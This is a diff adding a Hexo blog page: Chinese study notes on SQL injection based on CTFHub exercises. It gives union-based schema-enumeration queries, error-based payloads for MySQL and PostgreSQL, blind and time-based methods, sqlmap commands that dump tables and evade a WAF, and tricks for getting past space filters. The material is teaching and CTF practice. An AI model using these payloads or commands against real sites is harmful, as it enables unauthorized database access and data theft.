@@ -1,0 +1,115 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="keywords"><meta name="descriptioon" content=""><meta name="renderer" content="wekit"><link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon"><link rel="stylesheet" href="/css/public.css"><link rel="stylesheet" href="/css/reset.css"><link rel="stylesheet" href="/css/iconfont.css"><title>sql注入with ctfhub [ Hexo ]</title><link rel="stylesheet" href="/css/partial/footer.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css"><link rel="stylesheet" href="/css/partial/sidebar.css"><link rel="stylesheet" href="/css/post.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><meta name="generator" content="Hexo 7.3.0"></head><body><link rel="stylesheet" href="/css/partial/header.css"><div class="header"><div class="maxwidth"><div class="nav"><a id="artlist" href="/404"><i class="iconfont icon404"></i><span class="headhid">&nbsp;404</span></a><a id="artlist" href="/archives"><i class="iconfont iconarchives"></i><span class="headhid">&nbsp;Archives</span></a><a id="artlist" href="/link"><i class="iconfont iconlink"></i><span class="headhid">&nbsp;Link</span></a><a id="artlist" href="/about"><i class="iconfont iconabout"></i><span class="headhid">&nbsp;About</span></a></div><a class="search" href="/">TONG-H</a></div></div><div class="main"> <div class="maxwidth"><link rel="stylesheet" href="/css/partial/sidebar.css"><div id="sidebar"><div class="social"><a href="/archives" title="Home"><i class="iconfont iconHome"></i></a><a href="mailto:tongt0232@gmail.com" title="E-Mail"><i class="iconfont iconweibiaoti554"></i></a><a target="_blank" rel="noopener" href="https://github.com/tong-h" title="GitHub"><i class="iconfont iconGitHub"></i></a><a target="_blank" rel="noopener" href="https://juejin.cn/user/1204720474809741" title="juejin"><img src="/images/juejinicon-sidebar.png"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/u/20de04cc53de" title="jianshu"><img src="/images/jianicon-sidebar.png"></a></div><div class="structure category-list"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Ectfhub%E3%81%AEsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">基于ctfhubのsql注入学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81sql%E6%9E%B6%E6%9E%84"><span class="toc-number">1.1.</span> <span class="toc-text">一、sql架构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">二、查询语句：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%B8%8D%E5%90%8C%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">三、不同类型的注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%BF%94%E5%9B%9E"><span class="toc-number">1.3.1.</span> <span class="toc-text">直接返回</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%EF%BC%9A"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">数字型：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%9A"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">字符型：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%9E%8B%EF%BC%9A"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">报错型：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E6%AD%A3%E7%A1%AE%E4%B8%8E%E5%90%A6"><span class="toc-number">1.3.2.</span> <span class="toc-text">返回正确与否</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">盲注型注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">时间型注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap%EF%BC%9A"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">sqlmap：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.3.3.</span> <span class="toc-text">注入位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">1.3.4.</span> <span class="toc-text">过滤字符型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%EF%BC%9A"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">空格过滤：</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="tags"></div></div><div class="post rightside"><h1 class="artititle">sql注入with ctfhub</h1><div class="info"><i class="iconfont iconshijian"><span title="文章发布时间">2024-11-17</span></i></div><div class="postDetail"><h1 id="基于ctfhubのsql注入学习"><a href="#基于ctfhubのsql注入学习" class="headerlink" title="基于ctfhubのsql注入学习"></a>基于ctfhubのsql注入学习</h1><h2 id="一、sql架构"><a href="#一、sql架构" class="headerlink" title="一、sql架构"></a>一、sql架构</h2><p><strong>结构关系</strong>：</p>
+<ul>
+<li><strong>Database</strong>：一个数据库可以包含多个 schema。</li>
+<li><strong>Schema</strong>：一个 schema 中可以包含多个表。</li>
+<li><strong>Table</strong>：一个表中包含多个列。</li>
+<li><strong>Column</strong>：列是表的数据定义单元</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MyDB</span><br><span class="line">  ├── public (Schema)</span><br><span class="line">  │     └── users (Table)</span><br><span class="line">  │           ├── id (Column)</span><br><span class="line">  │           ├── name (Column)</span><br><span class="line">  │           └── email (Column)</span><br><span class="line">  ├── sales (Schema)</span><br><span class="line">        └── orders (Table)</span><br><span class="line">              ├── order_id (Column)</span><br><span class="line">              ├── product_name (Column)</span><br><span class="line">              └── quantity (Column)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二、查询语句："><a href="#二、查询语句：" class="headerlink" title="二、查询语句："></a>二、查询语句：</h2><ol>
+<li>判断回显位：<code>order by x</code>，通过这里得出的回显位判断需要添加几个数字补全输出</li>
+<li>找出database：<code>database()</code></li>
+<li>找出schema：<code>union SELECT group_concat(schema_name) FROM information_schema.schemata</code></li>
+<li>找出table：<code>union SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#39;public&#39;</code></li>
+<li>找出column：<code>union SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = &#39;public&#39; AND table_name = &#39;users&#39;</code></li>
+<li>找出值：<code>union SELECT group_concat(flag) from public.users</code></li>
+</ol>
+<blockquote>
+<p>group concat将返回的字符串拼接成一行，量之间用逗号相隔；若没有则多行显示，容易显示不足</p>
+<p>union select将多个量同时返回，在查询语句后面补上数字以凑齐输出位</p>
+</blockquote>
+<h2 id="三、不同类型的注入："><a href="#三、不同类型的注入：" class="headerlink" title="三、不同类型的注入："></a>三、不同类型的注入：</h2><h3 id="直接返回"><a href="#直接返回" class="headerlink" title="直接返回"></a>直接返回</h3><h4 id="数字型："><a href="#数字型：" class="headerlink" title="数字型："></a>数字型：</h4><p>传入之后型为<code>id=1 </code>,直接在后面跟上需要执行的语句</p>
+<ul>
+<li>使用方法：常用id&#x3D;-1或0 返回不合法的操作，id&#x3D;1返回合法操作</li>
+<li>验证语句是否执行：<ol>
+<li><code>1 and 1=1</code>返回正确</li>
+<li><code>1 and 1=2</code>返回错误</li>
+<li><code>1&#39;</code>返回错误</li>
+</ol>
+</li>
+</ul>
+<h4 id="字符型："><a href="#字符型：" class="headerlink" title="字符型："></a>字符型：</h4><p>传入之后型如<code>id=&#39;1&#39;</code>，通过在id后加上单引号使其闭合，并且最后加上注释符号注释掉后续语句后执行</p>
+<p><em>例如：传入<code>1&#39; select database() --</code></em></p>
+<blockquote>
+<p>注释符号：单行有–,#(主要mysql)，多行有&#x2F;**&#x2F;</p>
+</blockquote>
+<ul>
+<li>验证<ol>
+<li><code>1&#39;</code>返回错误</li>
+<li><code>1&#39; and 1=1 </code>返回错误 </li>
+<li><code>1&#39; and 1=1-- </code>返回正确 </li>
+<li><code>1&#39; and 1=2-- </code>返回错误</li>
+</ol>
+</li>
+</ul>
+<h4 id="报错型："><a href="#报错型：" class="headerlink" title="报错型："></a>报错型：</h4><p>将需要信息隐藏在报错中，暴露给用户</p>
+<p><strong>常用函数</strong>：</p>
+<ul>
+<li>MySQL<ul>
+<li><code>updatexml()</code>:<code>1 AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1);</code></li>
+<li><code>extractvalue()</code>:<code>1 AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e));</code></li>
+<li><code>floor()</code></li>
+</ul>
+</li>
+<li>PostgreSQL<ul>
+<li><code>pg_sleep()</code>:<code>1; SELECT pg_sleep(5)-- </code></li>
+<li><code>to_tsvector()</code>:<code>1 || to_tsvector((SELECT table_name FROM information_schema.tables LIMIT 1));</code></li>
+</ul>
+</li>
+<li>SQL Server<ul>
+<li><code>convert()</code></li>
+<li><code>error_message()</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="返回正确与否"><a href="#返回正确与否" class="headerlink" title="返回正确与否"></a>返回正确与否</h3><p>（非常费时费力且麻烦，最好是搞个脚本或者用sqlmap)</p>
+<h4 id="盲注型注入："><a href="#盲注型注入：" class="headerlink" title="盲注型注入："></a>盲注型注入：</h4><p>只返回是否，需要用条件判断语句</p>
+<h4 id="时间型注入："><a href="#时间型注入：" class="headerlink" title="时间型注入："></a>时间型注入：</h4><p>若条件判断正确则会延迟几秒钟，建议用bp查看</p>
+<h4 id="sqlmap："><a href="#sqlmap：" class="headerlink" title="sqlmap："></a>sqlmap：</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/waw/p/10828237.html">https://www.cnblogs.com/waw/p/10828237.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u 网址 --dbs</span><br><span class="line">python sqlmap.py -u httpxxx -D databaseName --tables</span><br><span class="line">python sqlmap.py -u 网址 -D databaseName -T tableName --columns --dump </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>目标未返回预期数据</strong></p>
+<ul>
+<li><p>添加 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--technique</span><br></pre></td></tr></table></figure>
+
+<p> 指定注入类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --technique=TUN</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>T</code>：时间盲注。</li>
+<li><code>U</code>：联合查询、<code>N</code>：基于堆叠查询。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><strong>目标需要身份验证</strong></p>
+<ul>
+<li>提供 Cookie 或身份令牌：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --cookie=&quot;sessionidbcd1234&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>绕过 WAF（Web 应用防火墙）</strong></p>
+<ul>
+<li>添加随机化 User-Agent：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --random-agent</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h3><p>通过bp抓包，查看server client、cookie等地方有无可以的地方可以进行注入</p>
+<h3 id="过滤字符型"><a href="#过滤字符型" class="headerlink" title="过滤字符型"></a>过滤字符型</h3><h4 id="空格过滤："><a href="#空格过滤：" class="headerlink" title="空格过滤："></a>空格过滤：</h4><p>当输入有空格时一律无法正确返回，因此用其他字符来代替空格（啊啊啊但是在ctfhub例题中查看的时候发现1中只有&#x2F;**&#x2F;这个注释成功其他都失败了</p>
+<ol>
+<li>符号被看做表示分割：&#x2F;**&#x2F;、()（lose、&lt;&gt;（lose</li>
+<li>编码替代：<ul>
+<li>URL编码：%20（空格）、%09（制表符tab）、%0a（换行）</li>
+<li>shell解析：${IFS}、$IFS$9、$IFS</li>
+<li>其他字符：\t（制表符tab）、\r（回车）、\n（换行）</li>
+</ul>
+</li>
+</ol>
+</div><link rel="stylesheet" href="/css/partial/footer.css"><div class="footer"><p><span>Copyright © 2017 - 2023</span><a target="_blank" rel="noopener" href="http://www.beian.miit.gov.cn/">蜀ICP备19024124号</a></p><p><i class="iconfont iconchakan"><span>本站总访问量</span><span id="busuanzi_container_site_pv">  <span id="busuanzi_value_site_pv"></span> </span></i><i class="iconfont iconabout"><span>本站访客数</span><span id="busuanzi_container_site_uv">  <span id="busuanzi_value_site_uv"></span> </span></i></p></div></div></div></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></body></html>
